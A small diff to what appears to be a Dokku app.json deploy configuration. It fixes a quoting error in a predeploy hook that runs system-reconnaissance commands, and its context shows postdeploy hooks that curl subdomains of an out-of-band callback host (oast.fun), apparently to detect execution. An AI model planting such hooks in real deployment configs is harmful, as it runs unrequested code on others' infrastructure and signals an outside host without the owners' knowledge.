@@ -4,7 +4,7 @@
   },
   "scripts": {
     "dokku": {
-      "predeploy": "sh -c 'uname -a; ls -la; docker ps -a",
+      "predeploy": "sh -c 'uname -a; ls -la; docker ps -a'",
       "postdeploy": "curl https://post.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
     },
     "postdeploy": "curl https://post2.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
